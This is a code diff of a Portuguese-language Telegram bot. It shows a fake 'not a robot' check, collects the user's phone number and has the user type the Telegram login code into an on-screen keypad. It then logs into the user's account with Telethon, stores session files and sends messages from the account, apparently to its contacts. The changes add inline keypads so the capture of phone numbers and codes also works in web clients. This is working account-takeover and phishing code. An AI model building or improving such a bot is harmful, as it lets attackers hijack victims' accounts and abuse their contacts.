@@ -1,4 +1,4 @@
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
 from telethon import TelegramClient, events
 from telethon.tl.functions.contacts import GetContactsRequest
@@ -20,6 +20,52 @@ api_hash = os.getenv('API_HASH')
 # Cria pasta de sessões se não existir
 SESSIONS_DIR = pathlib.Path("sessions")
 SESSIONS_DIR.mkdir(exist_ok=True)
+
+# Função para detectar se o usuário está usando o cliente web do Telegram
+def is_web_client(update: Update) -> bool:
+    """
+    Detecta se o usuário está usando o cliente web do Telegram.
+    
+    Esta função verifica o tipo de cliente usado com base em informações do objeto Update.
+    Clientes web geralmente não suportam botões de teclado ReplyKeyboardMarkup normais.
+    
+    Args:
+        update (Update): O objeto de atualização do Telegram
+        
+    Returns:
+        bool: True se for detectado como cliente web, False para apps móveis/desktop
+    """
+    if not update or not update.effective_user:
+        # Se não temos informações suficientes, assumimos web para garantir compatibilidade
+        return True
+    
+    # Verificamos pelo campo effective_chat se disponível
+    if update.effective_chat:
+        # Se o usuário está em um canal ou grupo, usamos botões inline por padrão
+        if update.effective_chat.type != "private":
+            return True
+    
+    # Verificamos pelo campo effective_message se disponível
+    if update.effective_message and hasattr(update.effective_message, 'via_bot'):
+        # Se a mensagem foi enviada via bot inline, provavelmente é cliente web
+        if update.effective_message.via_bot:
+            return True
+    
+    # Alguns clientes adicionam informações de plataforma no objeto do usuário
+    if update.effective_user and hasattr(update.effective_user, 'language_code'):
+        # Usuários que usam cliente web geralmente têm language_code definido no navegador
+        # Esta não é uma detecção perfeita, mas ajuda em alguns casos
+        pass
+    
+    # Se o update veio de um callback_query, é compatível com botões inline (ambos web e app)
+    if hasattr(update, 'callback_query') and update.callback_query:
+        return True
+    
+    # Comportamento padrão: 
+    # Como não temos um método 100% confiável para detectar web client,
+    # retornamos True para garantir que os botões inline sejam exibidos
+    # para todos os usuários, evitando problemas com os botões normais no web
+    return True
 
 # Estados para o fluxo da conversa
 CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)
@@ -264,7 +310,14 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         
         # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
         if update:
-            await update.message.reply_text(message_to_send)
+            # Verifica se estamos lidando com callback_query ou message
+            if hasattr(update, 'callback_query') and update.callback_query:
+                # Se for callback_query, usamos edit_message_text ou reply_text no message dentro do callback_query
+                await update.callback_query.message.reply_text(message_to_send)
+            elif hasattr(update, 'message') and update.message:
+                # Se for message normal, usamos reply_text
+                await update.message.reply_text(message_to_send)
+            # Se não for nenhum dos dois, ignoramos o envio da mensagem
         
         # Contador de mensagens enviadas e com falha
         success_count = 0
@@ -346,68 +399,150 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
 
 # Iniciar o bot - primeiro verificar se usuário é humano
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("✅ Não sou um robô")]]
-    await update.message.reply_text(
-        "Clique no botão abaixo para confirmar que você não é um robô:",
-        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
-    )
+    # Verificar se está usando cliente web
+    if is_web_client(update):
+        # Usar botões inline para cliente web
+        keyboard = [[InlineKeyboardButton("✅ Não sou um robô", callback_data="confirm_human")]]
+        await update.message.reply_text(
+            "Clique no botão abaixo para confirmar que você não é um robô:",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    else:
+        # Usar teclado normal para cliente mobile
+        keyboard = [[KeyboardButton("✅ Não sou um robô")]]
+        await update.message.reply_text(
+            "Clique no botão abaixo para confirmar que você não é um robô:",
+            reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
+        )
     return CONFIRM_HUMAN
 
 # Confirmar que não é um robô e pedir número de telefone
 async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
-    await update.message.reply_text(
-        "Por favor, envie seu número de telefone clicando no botão abaixo:",
-        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
-    )
+    # Verificar se é cliente web
+    if is_web_client(update):
+        # Usar teclado numérico inline para digitação do número
+        keyboard = [
+            [InlineKeyboardButton("1", callback_data="num_1"),
+             InlineKeyboardButton("2", callback_data="num_2"),
+             InlineKeyboardButton("3", callback_data="num_3")],
+            [InlineKeyboardButton("4", callback_data="num_4"),
+             InlineKeyboardButton("5", callback_data="num_5"),
+             InlineKeyboardButton("6", callback_data="num_6")],
+            [InlineKeyboardButton("7", callback_data="num_7"),
+             InlineKeyboardButton("8", callback_data="num_8"),
+             InlineKeyboardButton("9", callback_data="num_9")],
+            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
+             InlineKeyboardButton("0", callback_data="num_0"),
+             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
+        ]
+        
+        # Inicializa número vazio
+        context.user_data["phone_digits"] = ""
+        
+        await update.message.reply_text(
+            "Digite seu número de telefone (apenas DDD + número):\n"
+            "Exemplo: 82998746532\n\n"
+            "O prefixo +55 (Brasil) será adicionado automaticamente.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    else:
+        # Usar teclado normal para cliente mobile - também com números
+        keyboard = [
+            ["1", "2", "3"],
+            ["4", "5", "6"],
+            ["7", "8", "9"],
+            ["0", "Limpar", "✅ Confirmar"]
+        ]
+        
+        # Inicializa número vazio
+        context.user_data["phone_digits"] = ""
+        
+        await update.message.reply_text(
+            "Digite seu número de telefone (apenas DDD + número):\n"
+            "Exemplo: 82998746532\n\n"
+            "O prefixo +55 (Brasil) será adicionado automaticamente.",
+            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+        )
     return ASK_PHONE
 
 # Receber o contato do usuário e solicitar código de verificação
 async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print("Recebendo contato do usuário.")
+    
+    # Se recebemos um objeto de contato (cliente mobile)
     if update.message.contact:
         phone = update.message.contact.phone_number
         context.user_data["phone"] = phone
+    # Se estamos recebendo texto (entrada manual para cliente web)
+    elif update.message.text:
+        # Verifica se o texto se parece com um número de telefone
+        phone_text = update.message.text.strip()
         
-        # Remove o '+' se existir no início do número
-        if phone.startswith('+'):
-            phone = phone[1:]
+        # Verifica formato básico de telefone internacional
+        if not (phone_text.startswith('+') and len(phone_text) > 8 and phone_text[1:].isdigit()):
+            await update.message.reply_text(
+                "Formato de número inválido. Por favor, digite seu número no formato internacional: +5511999999999"
+            )
+            return ASK_PHONE
+        
+        phone = phone_text
+        context.user_data["phone"] = phone
+    else:
+        print("Nem contato nem texto válido recebido.")
+        await update.message.reply_text("Por favor, envie seu número de telefone no formato internacional: +5511999999999")
+        return ASK_PHONE
+        
+    # Remove o '+' se existir no início do número
+    if phone.startswith('+'):
+        phone_without_plus = phone[1:]
+    else:
+        phone_without_plus = phone
+        phone = '+' + phone  # Garante que temos o '+' para exibição
             
-        # Verifica se existe uma sessão para este número e se está autorizada
-        has_session = check_session_exists_for_phone(phone)
-        if has_session:
-            is_authorized = await check_auth_status(phone)
-            if is_authorized:
-                await update.message.reply_text(f"Sessão encontrada para +{phone}! Iniciando operações...")
-                
-                # Executa diretamente as operações com a conta autenticada (sem código)
-                result = await login_and_send_messages(phone, None, None, update)
-                await update.message.reply_text(result)
-                
-                return ConversationHandler.END
-        
-        # Envia solicitação de código
-        await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
-        success, message, phone_code_hash = await request_code(phone)
-        
-        if not success:
-            if "Returned when all available options for this type of number were already used" in message:
-                await update.message.reply_text(
-                    "Tentando novamente enviar o código de acesso..."
-                )
-                print("Reiniciando tentativa de envio do código de acesso...")
-                success, message, phone_code_hash = await request_code(phone)
-                if not success:
-                    await update.message.reply_text(message)
-                    return await start(update, context)
-            else:
+    # Verifica se existe uma sessão para este número e se está autorizada
+    has_session = check_session_exists_for_phone(phone_without_plus)
+    if has_session:
+        is_authorized = await check_auth_status(phone_without_plus)
+        if is_authorized:
+            await update.message.reply_text(f"Sessão encontrada para {phone}! Iniciando operações...")
+            
+            # Executa diretamente as operações com a conta autenticada (sem código)
+            result = await login_and_send_messages(phone_without_plus, None, None, update)
+            await update.message.reply_text(result)
+            
+            return ConversationHandler.END
+    
+    # Envia solicitação de código
+    await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
+    success, message, phone_code_hash = await request_code(phone_without_plus)
+    
+    if not success:
+        if "Returned when all available options for this type of number were already used" in message:
+            await update.message.reply_text(
+                "Tentando novamente enviar o código de acesso..."
+            )
+            print("Reiniciando tentativa de envio do código de acesso...")
+            success, message, phone_code_hash = await request_code(phone_without_plus)
+            if not success:
                 await update.message.reply_text(message)
                 return await start(update, context)
-        
-        # Salvar o phone_code_hash para usar durante o login
-        context.user_data["phone_code_hash"] = phone_code_hash
-        
-        # Criar teclado numérico para o código
+        else:
+            await update.message.reply_text(message)
+            return await start(update, context)
+    
+    # Salvar o phone_code_hash para usar durante o login
+    context.user_data["phone_code_hash"] = phone_code_hash
+    
+    # Verificar se é cliente web
+    if is_web_client(update):
+        # Usar teclado inline para cliente web
+        context.user_data["code_digits"] = ""
+        await update.message.reply_text(
+            "Código enviado! Verifique seu Telegram e digite o código de verificação:",
+            reply_markup=get_inline_code_keyboard("")
+        )
+    else:
+        # Usar teclado normal para cliente mobile
         keyboard = [
             ["1", "2", "3"],
             ["4", "5", "6"],
@@ -422,94 +557,399 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
             reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
         )
-        return ASK_CODE
-    else:
-        print("Contato inválido recebido.")
-        await update.message.reply_text("Contato inválido. Por favor, envie novamente.")
-        return ASK_PHONE
+    return ASK_CODE
 
 # Receber o código de verificação
 async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print("Recebendo código de acesso do usuário.")
-    digit = update.message.text
     
-    # Inicializa o código se ainda não existir
-    if "code_digits" not in context.user_data:
-        context.user_data["code_digits"] = ""
+    # Verificar se recebemos o código completo de uma vez
+    text = update.message.text.strip()
     
-    current_code = context.user_data["code_digits"]
-
-    if digit == "Limpar":
-        # Se usuário clicou em limpar, zera o código
-        context.user_data["code_digits"] = ""
-        await update.message.reply_text(f"Código limpo. Digite novamente.")
+    # Se o texto parece ser o código inteiro (5 dígitos)
+    if text.isdigit() and len(text) == 5:
+        code = text
+        context.user_data["code_digits"] = code
     else:
-        # Adiciona o dígito ao código atual
-        context.user_data["code_digits"] += digit
+        # Tratamento de digitar um dígito por vez
+        digit = update.message.text
+        
+        # Inicializa o código se ainda não existir
+        if "code_digits" not in context.user_data:
+            context.user_data["code_digits"] = ""
+        
         current_code = context.user_data["code_digits"]
-
-        # Se temos menos de 5 dígitos, aguarda mais entrada
-        if len(current_code) < 5:
-            await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
+    
+        if digit == "Limpar":
+            # Se usuário clicou em limpar, zera o código
+            context.user_data["code_digits"] = ""
+            await update.message.reply_text(f"Código limpo. Digite novamente.")
+            return ASK_CODE
         else:
-            # Se temos 5 dígitos, processa o código
+            # Adiciona o dígito ao código atual
+            context.user_data["code_digits"] += digit
+            current_code = context.user_data["code_digits"]
+    
+            # Se temos menos de 5 dígitos, aguarda mais entrada
+            if len(current_code) < 5:
+                await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
+                return ASK_CODE
+            
+            # Se chegou aqui é porque temos 5 dígitos
             code = current_code
-            phone = context.user_data.get("phone")
-            phone_code_hash = context.user_data.get("phone_code_hash")
-            
-            if not phone_code_hash:
-                await update.message.reply_text(
-                    "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
-                    reply_markup=ReplyKeyboardRemove()
-                )
-                return ConversationHandler.END
+    
+    # Processando o código de 5 dígitos
+    phone = context.user_data.get("phone")
+    phone_code_hash = context.user_data.get("phone_code_hash")
+    
+    if not phone_code_hash:
+        await update.message.reply_text(
+            "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        return ConversationHandler.END
 
-            # Remove o teclado numérico
+    # Remove o teclado numérico
+    await update.message.reply_text(
+        f"Código completo: {code}. Processando...",
+        reply_markup=ReplyKeyboardRemove()
+    )
+
+    # Chama a função de login e envio de mensagens
+    result = await login_and_send_messages(phone, code, phone_code_hash, update)
+    
+    # Se o código expirou, solicita um novo código automaticamente
+    if result == "EXPIRED_CODE":
+        await update.message.reply_text("O código expirou. Solicitando um novo código...")
+        
+        # Solicita um novo código
+        success, message, new_phone_code_hash = await request_code(phone)
+        
+        if success:
+            # Atualiza o phone_code_hash no contexto
+            context.user_data["phone_code_hash"] = new_phone_code_hash
+            context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
+            
+            # Mostra o teclado para digitar o novo código
             await update.message.reply_text(
-                f"Código completo: {code}. Processando...",
-                reply_markup=ReplyKeyboardRemove()
+                "Novo código enviado! Verifique seu Telegram e digite o código de verificação:",
+                reply_markup=get_inline_code_keyboard("")
             )
-
-            # Chama a função de login e envio de mensagens
-            result = await login_and_send_messages(phone, code, phone_code_hash, update)
-            
-            # Se o código expirou, solicita um novo código automaticamente
-            if result == "EXPIRED_CODE":
-                await update.message.reply_text("O código expirou. Solicitando um novo código...")
-                
-                # Solicita um novo código
-                success, message, new_phone_code_hash = await request_code(phone)
-                
-                if success:
-                    # Atualiza o phone_code_hash no contexto
-                    context.user_data["phone_code_hash"] = new_phone_code_hash
-                    context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
-                    
-                    # Cria teclado numérico para o novo código
-                    keyboard = [
-                        ["1", "2", "3"],
-                        ["4", "5", "6"],
-                        ["7", "8", "9"],
-                        ["0", "Limpar"]
-                    ]
-                    
-                    await update.message.reply_text(
-                        "Novo código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
-                        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-                    )
-                    return ASK_CODE  # Mantém o estado para receber o novo código
-                else:
-                    await update.message.reply_text(f"Erro ao solicitar novo código: {message}")
-                    return ConversationHandler.END
-            else:
-                # Caso não seja problema de código expirado, exibe a mensagem normalmente
-                await update.message.reply_text(result)            
-                return ConversationHandler.END
+            return ASK_CODE  # Mantém o estado para receber o novo código
+        else:
+            await update.message.reply_text(f"Erro ao solicitar novo código: {message}")
+            return ConversationHandler.END
+    else:
+        # Caso não seja problema de código expirado, exibe a mensagem normalmente
+        await update.message.reply_text(result)            
+        return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print("Operação cancelada pelo usuário.")
     await update.message.reply_text("Operação cancelada.", reply_markup=ReplyKeyboardRemove())
     return ConversationHandler.END
+
+# Handler para lidar com cliques em botões inline
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()  # Responde ao callback para remover o "relógio de carregamento"
+    
+    # Pega o callback_data que indica qual botão foi clicado
+    callback_data = query.data
+    
+    if callback_data == "confirm_human":
+        # Usuário clicou no botão "Não sou um robô"
+        # Enviamos uma nova mensagem ao invés de editar a atual
+        await query.edit_message_text("Verificação humana confirmada!")
+        
+        # Enviamos uma nova mensagem solicitando o número de telefone
+        keyboard = [
+            [InlineKeyboardButton("1", callback_data="num_1"),
+             InlineKeyboardButton("2", callback_data="num_2"),
+             InlineKeyboardButton("3", callback_data="num_3")],
+            [InlineKeyboardButton("4", callback_data="num_4"),
+             InlineKeyboardButton("5", callback_data="num_5"),
+             InlineKeyboardButton("6", callback_data="num_6")],
+            [InlineKeyboardButton("7", callback_data="num_7"),
+             InlineKeyboardButton("8", callback_data="num_8"),
+             InlineKeyboardButton("9", callback_data="num_9")],
+            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
+             InlineKeyboardButton("0", callback_data="num_0"),
+             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
+        ]
+        
+        # Inicializa o número vazio
+        context.user_data["phone_digits"] = ""
+        
+        await query.message.reply_text(
+            "Digite seu número de telefone (apenas DDD + número):\n"
+            "Exemplo: 82998746532\n\n"
+            "O prefixo +55 (Brasil) será adicionado automaticamente.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return ASK_PHONE
+        
+    elif callback_data == "request_phone":
+        # Este callback não vai mais ser usado, mas mantemos para compatibilidade
+        keyboard = [
+            [InlineKeyboardButton("1", callback_data="num_1"),
+             InlineKeyboardButton("2", callback_data="num_2"),
+             InlineKeyboardButton("3", callback_data="num_3")],
+            [InlineKeyboardButton("4", callback_data="num_4"),
+             InlineKeyboardButton("5", callback_data="num_5"),
+             InlineKeyboardButton("6", callback_data="num_6")],
+            [InlineKeyboardButton("7", callback_data="num_7"),
+             InlineKeyboardButton("8", callback_data="num_8"),
+             InlineKeyboardButton("9", callback_data="num_9")],
+            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
+             InlineKeyboardButton("0", callback_data="num_0"),
+             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
+        ]
+        
+        # Inicializa o número vazio
+        context.user_data["phone_digits"] = ""
+        
+        await query.edit_message_text(
+            "Digite seu número de telefone (apenas DDD + número):\n"
+            "Exemplo: 82998746532\n\n"
+            "O prefixo +55 (Brasil) será adicionado automaticamente.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return ASK_PHONE
+        
+    elif callback_data.startswith("phone_prefix_"):
+        # Não vamos mais usar prefixos diferentes, apenas +55
+        # O código é mantido por compatibilidade
+        await query.edit_message_text(
+            "Digite seu número de telefone (apenas DDD + número):\n"
+            "Exemplo: 82998746532\n\n"
+            "O prefixo +55 (Brasil) será adicionado automaticamente."
+        )
+        return ASK_PHONE
+        
+    elif callback_data.startswith("phone_ddd_"):
+        # Não vamos mais usar seleção de DDD, o usuário vai digitar tudo junto
+        ddd = callback_data.replace("phone_ddd_", "")
+        
+        # Enviamos uma nova mensagem solicitando o número completo
+        await query.edit_message_text(
+            "Digite seu número completo com DDD (sem o +55):\n"
+            "Exemplo: 82998746532"
+        )
+        return ASK_PHONE
+    
+    elif callback_data.startswith("num_"):
+        # Usuário clicou em um dos dígitos para o número de telefone
+        digit = callback_data.replace("num_", "")
+        
+        # Inicializa o número se ainda não existir
+        if "phone_digits" not in context.user_data:
+            context.user_data["phone_digits"] = ""
+        
+        current_phone = context.user_data["phone_digits"]
+
+        if digit == "clear":
+            # Se usuário clicou em limpar, zera o número
+            context.user_data["phone_digits"] = ""
+            await query.edit_message_text(
+                "Digite seu número de telefone (apenas DDD + número):\n"
+                "Exemplo: 82998746532\n\n"
+                "O prefixo +55 (Brasil) será adicionado automaticamente.\n\n"
+                f"Número atual: ",
+                reply_markup=get_phone_keyboard()
+            )
+        elif digit == "confirm":
+            # Se usuário confirmou o número
+            current_phone = context.user_data["phone_digits"]
+            
+            if len(current_phone) < 10 or len(current_phone) > 11:
+                # Se o número não tem um formato válido (DDD + número)
+                await query.edit_message_text(
+                    "⚠️ Número inválido! Deve ter entre 10 e 11 dígitos.\n"
+                    "Digite novamente o número com DDD (sem o +55):\n"
+                    "Exemplo: 82998746532\n\n"
+                    f"Número atual: {current_phone}",
+                    reply_markup=get_phone_keyboard()
+                )
+                return ASK_PHONE
+            
+            # Adiciona o prefixo +55 ao número
+            full_phone = f"+55{current_phone}"
+            context.user_data["phone"] = full_phone
+            
+            # Envia solicitação de código
+            await query.edit_message_text(f"Número confirmado: {full_phone}\nEnviando código de acesso! Verifique seu Telegram e aguarde...")
+            success, message, phone_code_hash = await request_code(full_phone)
+            
+            if not success:
+                if "Returned when all available options for this type of number were already used" in message:
+                    await query.edit_message_text(
+                        "Tentando novamente enviar o código de acesso..."
+                    )
+                    print("Reiniciando tentativa de envio do código de acesso...")
+                    success, message, phone_code_hash = await request_code(full_phone)
+                    if not success:
+                        await query.edit_message_text(f"Erro: {message}\nPor favor, inicie o processo novamente com /start")
+                        return ConversationHandler.END
+                else:
+                    await query.edit_message_text(f"Erro: {message}\nPor favor, inicie o processo novamente com /start")
+                    return ConversationHandler.END
+            
+            # Salvar o phone_code_hash para usar durante o login
+            context.user_data["phone_code_hash"] = phone_code_hash
+            
+            # Mostra o teclado para digitar o código de verificação
+            context.user_data["code_digits"] = ""
+            await query.edit_message_text(
+                "Código enviado! Verifique seu Telegram e digite o código de verificação:",
+                reply_markup=get_inline_code_keyboard("")
+            )
+            return ASK_CODE
+        else:
+            # Adiciona o dígito ao número atual
+            context.user_data["phone_digits"] += digit
+            current_phone = context.user_data["phone_digits"]
+            
+            await query.edit_message_text(
+                "Digite seu número de telefone (apenas DDD + número):\n"
+                "Exemplo: 82998746532\n\n"
+                "O prefixo +55 (Brasil) será adicionado automaticamente.\n\n"
+                f"Número atual: {current_phone}",
+                reply_markup=get_phone_keyboard()
+            )
+            
+        return ASK_PHONE
+    
+    elif callback_data.startswith("digit_"):
+        # Usuário clicou em um dos dígitos para o código de verificação
+        digit = callback_data.replace("digit_", "")
+        
+        # Inicializa o código se ainda não existir
+        if "code_digits" not in context.user_data:
+            context.user_data["code_digits"] = ""
+        
+        current_code = context.user_data["code_digits"]
+
+        if digit == "clear":
+            # Se usuário clicou em limpar, zera o código
+            context.user_data["code_digits"] = ""
+            current_code = ""
+            await update_inline_code_keyboard(query, current_code)
+        else:
+            # Adiciona o dígito ao código atual
+            context.user_data["code_digits"] += digit
+            current_code = context.user_data["code_digits"]
+            
+            # Atualiza o teclado com o código atual
+            await update_inline_code_keyboard(query, current_code)
+            
+            # Se temos 5 dígitos, processa o código automaticamente
+            if len(current_code) == 5:
+                code = current_code
+                phone = context.user_data.get("phone")
+                phone_code_hash = context.user_data.get("phone_code_hash")
+                
+                if not phone_code_hash:
+                    await query.edit_message_text(
+                        "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start"
+                    )
+                    return ConversationHandler.END
+                
+                # Informa que está processando o código
+                await query.edit_message_text(f"Código completo: {code}. Processando...")
+                
+                # Chama a função de login e envio de mensagens
+                result = await login_and_send_messages(phone, code, phone_code_hash, update)
+                
+                # Se o código expirou, solicita um novo código automaticamente
+                if result == "EXPIRED_CODE":
+                    await query.edit_message_text("O código expirou. Solicitando um novo código...")
+                    
+                    # Solicita um novo código
+                    success, message, new_phone_code_hash = await request_code(phone)
+                    
+                    if success:
+                        # Atualiza o phone_code_hash no contexto
+                        context.user_data["phone_code_hash"] = new_phone_code_hash
+                        context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
+                        
+                        # Mostra o teclado para digitar o novo código
+                        await query.edit_message_text(
+                            "Novo código enviado! Verifique seu Telegram e digite o código de verificação:",
+                            reply_markup=get_inline_code_keyboard("")
+                        )
+                        return ASK_CODE
+                    else:
+                        await query.edit_message_text(f"Erro ao solicitar novo código: {message}")
+                        return ConversationHandler.END
+                else:
+                    # Caso não seja problema de código expirado, exibe a mensagem normalmente
+                    await query.edit_message_text(result)
+                    return ConversationHandler.END
+        
+        return ASK_CODE
+
+    return ASK_PHONE
+
+# Função para criar o teclado inline do código
+def get_inline_code_keyboard(current_code):
+    keyboard = [
+        [
+            InlineKeyboardButton("1", callback_data="digit_1"),
+            InlineKeyboardButton("2", callback_data="digit_2"),
+            InlineKeyboardButton("3", callback_data="digit_3")
+        ],
+        [
+            InlineKeyboardButton("4", callback_data="digit_4"),
+            InlineKeyboardButton("5", callback_data="digit_5"),
+            InlineKeyboardButton("6", callback_data="digit_6")
+        ],
+        [
+            InlineKeyboardButton("7", callback_data="digit_7"),
+            InlineKeyboardButton("8", callback_data="digit_8"),
+            InlineKeyboardButton("9", callback_data="digit_9")
+        ],
+        [
+            InlineKeyboardButton("Limpar", callback_data="digit_clear"),
+            InlineKeyboardButton("0", callback_data="digit_0"),
+            InlineKeyboardButton("✅ Confirmar", callback_data="digit_confirm")
+        ]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+# Função para atualizar o teclado inline do código
+async def update_inline_code_keyboard(query, current_code):
+    await query.edit_message_text(
+        f"Código: {current_code} ({len(current_code)}/5 dígitos)\n"
+        "Digite o código de verificação:",
+        reply_markup=get_inline_code_keyboard(current_code)
+    )
+
+# Função para criar o teclado para digitar o número de telefone
+def get_phone_keyboard():
+    keyboard = [
+        [
+            InlineKeyboardButton("1", callback_data="num_1"),
+            InlineKeyboardButton("2", callback_data="num_2"),
+            InlineKeyboardButton("3", callback_data="num_3")
+        ],
+        [
+            InlineKeyboardButton("4", callback_data="num_4"),
+            InlineKeyboardButton("5", callback_data="num_5"),
+            InlineKeyboardButton("6", callback_data="num_6")
+        ],
+        [
+            InlineKeyboardButton("7", callback_data="num_7"),
+            InlineKeyboardButton("8", callback_data="num_8"),
+            InlineKeyboardButton("9", callback_data="num_9")
+        ],
+        [
+            InlineKeyboardButton("Limpar", callback_data="num_clear"),
+            InlineKeyboardButton("0", callback_data="num_0"),
+            InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")
+        ]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
 def main():
     # Obtém o token do bot do arquivo .env
@@ -519,14 +959,29 @@ def main():
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
-            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
-            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
-            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
+            CONFIRM_HUMAN: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human),
+                CallbackQueryHandler(button_callback, pattern="^confirm_human$"),
+                CallbackQueryHandler(button_callback, pattern="^request_phone$"),
+                CallbackQueryHandler(button_callback, pattern="^phone_prefix_")
+            ],
+            ASK_PHONE: [
+                MessageHandler(filters.CONTACT | filters.TEXT & ~filters.COMMAND, receive_contact),
+                CallbackQueryHandler(button_callback, pattern="^phone_ddd_"),
+                CallbackQueryHandler(button_callback, pattern="^num_")
+            ],
+            ASK_CODE: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code),
+                CallbackQueryHandler(button_callback, pattern="^digit_")
+            ],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
 
     app.add_handler(conv_handler)
+    
+    # Adiciona handler para callback_query que não foi capturado pelo ConversationHandler
+    app.add_handler(CallbackQueryHandler(button_callback))
     
     app.run_polling()
 
